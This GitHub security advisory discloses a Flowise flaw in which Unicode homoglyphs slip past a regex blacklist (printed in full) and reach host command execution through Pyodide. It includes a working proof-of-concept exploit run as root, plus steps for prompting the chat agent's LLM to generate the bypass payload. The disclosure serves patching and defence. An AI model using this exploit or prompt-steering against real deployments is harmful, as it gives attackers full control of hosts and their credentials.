# [C] Flowise: Pyodide validator Unicode homoglyph bypass leads to RCE

## Summary
Severity: Critical
Advisory: GHSA-52fh-8v99-63c2
CVE: CVE-2026-70470
CWE: CWE-184
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-52fh-8v99-63c2
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3
- npm: `flowise-components` — affected >=0 <3.1.3

## Details
### Summary
The validatePythonCodeForDataFrame blacklist in packages/components/src/pythonCodeValidator.ts can be bypassed with Unicode homoglyph identifiers, allowing arbitrary Python execution inside Pyodide and full OS command execution on the Flowise host via Pyodide's js module interop. This reopens the RCE paths patched as GHSA-3hjv-c53m-58jj (CSV Agent) and GHSA-v38x-c887-992f (Airtable Agent).

### Details
packages/components/src/pythonCodeValidator.ts gates every call to pyodide.runPythonAsync in packages/components/nodes/agents/CSVAgent/CSVAgent.ts (lines 147, 198) and packages/components/nodes/agents/AirtableAgent/AirtableAgent.ts (line 186). The gate is a regex blacklist:

```ts
{ pattern: /\bimport\b/g, ... },
{ pattern: /\b__class__\b/g, ... },
{ pattern: /\b__subclasses__\s*\(/g, ... },
{ pattern: /\b__builtins__\b/g, ... },
{ pattern: /\b__mro__\b/g, ... },
// ... about 30 similar rules
```

Two design flaws combine into a bypass:

1. JavaScript regex `\b` is ASCII-only. Word boundaries are computed against the ASCII word class `[A-Za-z0-9_]`. A Unicode letter such as U+1D41A (mathematical bold small a) is treated as a non-word character, so `\b__class__\b` never matches `__cl𝐚ss__`.
2. Python 3 (PEP 3131) NFKC-normalizes every identifier at parse time. `__cl𝐚ss__`, `__subcl𝐚sses__`, `__b𝐚se__`, `__b𝐮iltins__`, and similar homoglyph forms are all parsed as their ASCII equivalents.

Attribute access `obj.__cl𝐚ss__` is normalized because attribute names are identifiers. Dict string keys such as `bi['__import__']` are not normalized, but they are free text and can be assembled with `chr()` to avoid literal matches on patterns like `\bimport\b` or `\b__import__\s*\(/`.

From inside Pyodide, `__builtins__['__import__']('js')` yields the JS host bridge. In the Node.js host that runs Flowise, that bridge exposes `process.mainModule.require('child_process').execSync`, which runs native commands on the host with the privileges of the Flowise process.

Affected call sites:
- packages/components/nodes/agents/CSVAgent/CSVAgent.ts:147 validates `customReadCSV` (node-config-controlled, interpolated into the read-CSV script on line 167) and 198 validates the LLM-generated `pythonCode` before it reaches `pyodide.runPythonAsync(code)` on line 209.
- packages/components/nodes/agents/AirtableAgent/AirtableAgent.ts:186 validates the LLM-generated `pythonCode` before `pyodide.runPythonAsync` on line 197.

The original patches for GHSA-3hjv-c53m-58jj (commit a24acac, PR #5701) and a24acac's follow-up (commit 0c8236a, PR #5836) rely entirely on this validator. Because the validator is bypassable, both advisories are effectively reintroduced in 3.1.2.

### PoC
Standalone reproduction that mirrors the exact code paths in CSVAgent.ts / AirtableAgent.ts. It feeds a malicious `pythonCode` to the real validator, confirms the validator returns `valid: true`, then runs the same string through Pyodide and prints the output of a native command executed on the host:

```js
// npm install pyodide
const { loadPyodide } = require('pyodide')

const FORBIDDEN_PATTERNS = [
  { pattern: /\bfrom\s+\S+\s+import\b/g }, { pattern: /\bimport\b/g },
  { pattern: /\beval\s*\(/g }, { pattern: /\bexec\s*\(/g },
  { pattern: /\bcompile\s*\(/g }, { pattern: /\b__import__\s*\(/g },
  { pattern: /\bopen\s*\(/g }, { pattern: /\bgetattr\s*\(/g },
  { pattern: /\bos\./g }, { pattern: /\bsubprocess\./g },
  { pattern: /\bsys\./g }, { pattern: /\bsocket\./g },
  { pattern: /\burllib\./g }, { pattern: /\brequests\./g },
  { pattern: /\b__builtins__\b/g }, { pattern: /\b__class__\b/g },
  { pattern: /\b__subclasses__\s*\(/g }, { pattern: /\b__bases__\b/g },
  { pattern: /\b__mro__\b/g }, { pattern: /\b__globals__\b/g },
  { pattern: /\b__code__\b/g }, { pattern: /\b__dict__\b/g },
]
const validate = (code) => FORBIDDEN_PATTERNS.every(p => { p.pattern.lastIndex = 0; return !p.pattern.test(code) })

const payload = `
cls = ().__cl\u{1D41A}ss__
base = cls.__b\u{1D41A}se__
subs = base.__subcl\u{1D41A}sses__()
for c in subs:
    if c.__name__ == 'catch_warnings':
        cw = c()
        bi = cw._module.__b\u{1D42E}iltins__
        imp_name = chr(95)*2 + 'imp' + 'ort' + chr(95)*2
        imp = bi[imp_name]
        js_mod = imp(chr(106)+chr(115))
        cp_name = 'child' + chr(95) + 'process'
        cp = js_mod.process.mainModule.require(cp_name)
        opts = js_mod.Object.new(); opts.encoding = 'utf8'
        result = cp.execSync('id && hostname && echo FLOWISE_RCE_CONFIRMED', opts)
        break
str(result)
`

;(async () => {
  console.log('validator passes:', validate(payload))   // true
  const py = await loadPyodide()
  console.log(await py.runPythonAsync(payload))
})()
```

Run output on a stock host:

```
validator passes: true
uid=0(root) gid=0(root) groups=0(root)
<hostname>
FLOWISE_RCE_CONFIRMED
```

Live path against a Flowise deployment:
1. Workspace user (or any user able to reach a public CSV Agent chatflow) opens a chatflow containing CSV_Agent or Airtable_Agent.
2. For the LLM-generated path: send a chat message via `POST /api/v1/prediction/{chatflowId}` that instructs the model to answer in Python using mathematical bold letters for `__class__`, `__subclasses__`, `__base__`, and `__builtins__`, following the structure above. The model's output is regex-validated (passes), then executed by Pyodide, giving RCE on the host.
3. For the direct path: a workspace user with chatflow edit rights sets `customReadCSV` to the payload above. Every subsequent prediction hits CSVAgent.ts:171 and runs the attacker-controlled code on the host.

### Impact
Any user able to reach a chatflow that uses CSV_Agent or Airtable_Agent, including unauthenticated users on public chatflows, can run arbitrary OS commands as the Flowise process on the host. That yields read/write access to every credential and file the Flowise process can reach, pivot into the internal network, and full compromise of multi-tenant workspaces that share the same server. The prior advisories GHSA-3hjv-c53m-58jj and GHSA-v38x-c887-992f were scored 9.8 critical for the same reachable sink; this finding restores that impact in version 3.1.2.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-52fh-8v99-63c2
- https://github.com/FlowiseAI/Flowise/pull/6499
- https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
